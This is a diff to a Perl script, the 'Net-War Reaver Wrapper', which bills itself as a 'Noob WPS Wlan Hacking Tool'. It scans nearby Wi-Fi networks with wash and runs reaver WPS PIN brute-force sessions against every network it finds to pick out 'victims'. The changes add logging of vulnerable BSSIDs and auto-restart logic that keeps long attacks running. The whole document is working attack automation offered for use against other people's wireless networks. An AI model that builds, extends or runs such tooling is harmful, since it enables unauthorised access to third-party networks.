@@ -5,10 +5,12 @@ autoflush STDOUT;
 ####################################################################################################
 my $logo=<<__HELP__;
 ===================================================================================================
-  		    ::::: Net-War Reaver Wrapper aka NWRW :::::
-		             The Noob Wlan Hacking Tool	
-			     Sven Wurth - dos\@net-war.de
-                                License: GPL (v2 only)
+::::: Net-War Reaver Wrapper aka NWRW :::::
+		           
+The Noob WPS Wlan Hacking Tool	
+Sven Wurth - dos\@net-war.de
+License: GPL (v2 only)
+
 ===================================================================================================
 __HELP__
 print $logo;
@@ -28,10 +30,10 @@ Have fun.
 
 GOALS:
 1. scan the available networks via "wash" (This tool is part of the reaver toolkit)
-2. try to attack them! do a short reaver session aggainst all the networks
+2. try to attack them! do a short reaver session against all the networks
    The goal is this step is to find vulnerable wps networks.
    Why? Not all WPS wlans are vulnerable. This step is a preselection. 
-   The attacking itself is slow (6-20hours), so we try to find networks for which the 
+   The attacking itself is slow (6-40hours), so we try to find networks for which the 
    time is a good investment.
    Example: "fritzbox" -> don't try it! the developers done a good job to implement WPS
 
@@ -46,6 +48,10 @@ REQUIREMENTS:
 
 INSTALL DOKU:
 aptitude install reaver
+
+KnownBugs:
+-If there is no process for a network check the log 'reaverlog' here is the full output from reaver.
+Sometimes the network hangs, waits for a beacon or something like that. 
 
 
 =================================================================
@@ -75,6 +81,7 @@ my $restart="$chip_rtl8187";
 
 my $ap_rate_limit="0";
 my @myp;
+my @myp2;
 my @sorted_myp;;
 my $possible_targets;
 my $bssid="";
@@ -84,7 +91,7 @@ my $washsleep="60"; #how long to sleep until we kill the wash process which show
 my @loga;
 my $restartcount="0";
 my $restarttries="3";
-my $attack_restarttries="300";
+my $attack_restarttries="50";
 my $logfile="/root/reaverlog";
 my $logpath="/root";
 my $cmd="reaver -v -i $mondev -b $bssid -a -s /usr/local/etc/reaver/$bssid_without_colon.wpc > $logfile 2>&1";
@@ -101,6 +108,14 @@ my $washline;
 my $num="0";
 my $hackable_targets;
 my $direct="0";
+my $vulnerablebssids="/root/vulnerable_bssids";
+my $beaconwait;
+my $idlecount;
+
+open FILE, ">",$vulnerablebssids or die "die!!!!!";
+print FILE "Here is the list of vulnernerable BSSIDs:\n";
+close FILE;
+
 
 foreach (@ARGV) {
 
@@ -110,8 +125,9 @@ foreach (@ARGV) {
    		if ($bssid =~ /([0-9a-f]{2}):([0-9a-f]{2}):([0-9a-f]{2}):([0-9a-f]{2}):([0-9a-f]{2}):([0-9a-f]{2})/i) {
                 	$bssid_without_colon="$1$2$3$4$5$6";
         	}
+		system("$restart");
 		$cmd="reaver -v -i $mondev -b $bssid -a -s /usr/local/etc/reaver/$bssid_without_colon.wpc > $logfile 2>&1 ";
-		print "\n::::: going directly to attack $ARGV[1]\n";
+		print "\n::::: directly attacking  \n";
 		attack_hackable();
 	}
 
@@ -171,6 +187,7 @@ my $targetcnt=@targets;
 my $tmptime=$targetcnt * $reaver_maxtesttime;
 my $tmptime=$tmptime/60;   
 print "\n::::: \tTestAttack Step  will take approx $tmptime minutes ";
+print "\n::::: \tVulnerable BSSIDs will be listet here: $vulnerablebssids";
 
 foreach $bssid (@targets){
 	$num++;
@@ -269,6 +286,7 @@ sub parsetestattack {
 					push (@attackable, $current_bssid);	
 					print "\n::::: >>>>>>>>>> nice, we have a victim which works";
 					$status =" !!! VULNERABLE !!! ";
+					writevulnerabletofile();
 					last;
 				}
 				else {
@@ -450,7 +468,7 @@ sub runtestattack {
 	}
 
 	print "\n\n::::: ================================================================================================================";
-	print "\n:::::  TEST ATTACK $num of $hackable_targets";
+	print "\n:::::  TEST ATTACK $num of $possible_targets";
 	print "\n::::: ================================================================================================================";
 	print "\n::::: >>>>>>>>>> running reaper against $current_bssid";
 	#print "\n$cmd";
@@ -494,9 +512,10 @@ sub runtestattack {
 
 
 sub attack_hackable {
+	$idlecount="0";
 	$washline="";
 	$ap_rate_limit="0";
-
+        $beaconwait="0";
 	if ($direct eq '0') { 
 		foreach (@washlog) {	
 			if ($_ =~ $current_bssid ) {
@@ -509,23 +528,53 @@ sub attack_hackable {
 	print "\n::::: ==================================================================================================================";
 	print "\n::::: >>>>>>>>>> running reaper against $current_bssid";
 	print "\n::::: >>>>>>>>>> $washline";
-	print "::::: >>>>>>>>>> \t !!!!! ATTACKING !!! ";
 	print "\n::::: >>>>>>>>>> $cmd";
 	system ("$cmd &");
 	sleep 1;
-	print "\n::::: OK reaper running";
+	print "\n::::: OK reaver running";
 	$restartcount="0";
 	while ($restartcount < $attack_restarttries){
 		sleep 60;
-		print "\n::::: checking log\t::: restarttries=$restartcount";
+		print "\n::::: checking log\t::: restarttries=$restartcount beaconwait=$beaconwait idlecount=$idlecount";
+ 
 		LOGR();
-		@sorted_myp=sort @myp;
-		print "\t >>>>> ALL FINE Status: 'up and running' @  @sorted_myp[-1] Percent";
+		@sorted_myp=sort {$b cmp $a}@myp;
+
+		if ( @sorted_myp[0] != '') {
+			if ( @sorted_myp[0] ~~ @myp2 ) { 
+				$idlecount++;
+			}
+			else {	
+				push (@myp2, "@sorted_myp[0]") ;
+			}
+		}
+		if ($idlecount eq 10 ) { 
+			print "\nno progress since some time ... restarting\n"; 
+  			killall();
+               		restart();
+			$idlecount="0";	
+		}
+
+		print "\t >>>>> ALL FINE Status: 'up and running' @  @sorted_myp[0] Percent";
+		if ($beaconwait > 10) {
+		 	print "\nwaited to long for beacon ....\n";
+			killall();
+                	restart();
+			$beaconwait="0";	
+
+		}
 	}
 	print "\n !!!!! TOO MUCH RESTARTS !!!!!\n ";
 }
 
 
+
+
+sub writevulnerabletofile{
+	open FILE, ">>",$vulnerablebssids or die "die!!!!!";
+	print FILE "$current_bssid\n";
+	close FILE;
+}
 
 sub LOGR{
 	open FILE, $logfile or die "die!!!!!";
@@ -572,8 +621,13 @@ sub LOGR{
 			restart();
 			last;
 		}
+		elsif ($_ =~ /Waiting for beacon from/) {
+			#set 6 min timer, if we see this and no progress -> abort
+			$beaconwait++;
+		}
 		if ($_ =~ /([0-9]{1,2}\.[0-9]{2})\%\ complete/) {
 			push (@myp, "$1") ;
+			$beaconwait=0;
 		}
 
 	}
